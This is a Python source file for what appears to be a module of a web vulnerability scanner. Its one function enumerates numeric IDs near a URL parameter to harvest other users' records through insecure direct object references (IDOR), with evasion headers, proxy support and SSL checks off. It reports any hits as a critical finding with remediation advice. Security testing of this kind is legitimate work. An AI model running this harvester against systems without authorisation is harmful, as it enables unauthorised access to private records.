import aiohttp
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

async def exploit_idor_harvester(url, param, log_callback=None, headers=None, proxy=None):
    """
    Attempts to harvest data by iterating numerical IDs (Mass Assignment / IDOR).
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    # logic:
    # 1. Parse URL, find param value (must be digit).
    # 2. Iterate -5 to +20
    # 3. Save unique valid responses.
    
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        target_val = None
        if param and param in params:
            target_val = params[param][0]
            
        if not target_val or not target_val.isdigit():
            # Try to find any digit param if specific param not valid
            if not target_val:
                for p, v in params.items():
                    if v[0].isdigit():
                        param = p
                        target_val = v[0]
                        break
        
        if not target_val or not target_val.isdigit():
            return [] # No numerical ID to harvest
            
        start_id = int(target_val)
        harvested_count = 0
        loot = []
        
        if log_callback: log_callback(f"   üë®‚Äçüåæ IDOR Harvester: Harvesting IDs around {start_id}...")
        
        async with aiohttp.ClientSession(headers=final_headers) as session:
            # We scan a small range to demonstrate impact without DoS
            for i in range(start_id - 5, start_id + 15):
                if i == start_id: continue # unique ones only
                if i < 0: continue
                
                p_copy = params.copy()
                p_copy[param] = [str(i)]
                exploit_url = urlunparse(parsed._replace(query=urlencode(p_copy, doseq=True)))
                
                try:
                    async with session.get(exploit_url, timeout=3, ssl=False, proxy=proxy) as resp:
                        if resp.status == 200:
                            # Heuristic: Check size or content diff?
                            # For simple demo, if 200 OK and not empty, we assume success.
                            # Ideally compare with 404/baselines.
                            text = await resp.text()
                            if len(text) > 100: # Filter empty rubbish
                                loot.append(f"ID {i}: {len(text)} bytes")
                                harvested_count += 1
                except Exception: pass
                
                await asyncio.sleep(0.1)
                
        if harvested_count > 0:
             findings.append({
                "type": "Data Harvesting (IDOR)",
                "severity": "Critical",
                "detail": f"Successfully harvested {harvested_count} records by iterating ID.",
                "evidence": "\n".join(loot[:5]) + ("\n..." if len(loot)>5 else ""),
                "remediation": "Implement Object Level Authorization checks."
            })
            
    except Exception: pass
    
    return findings
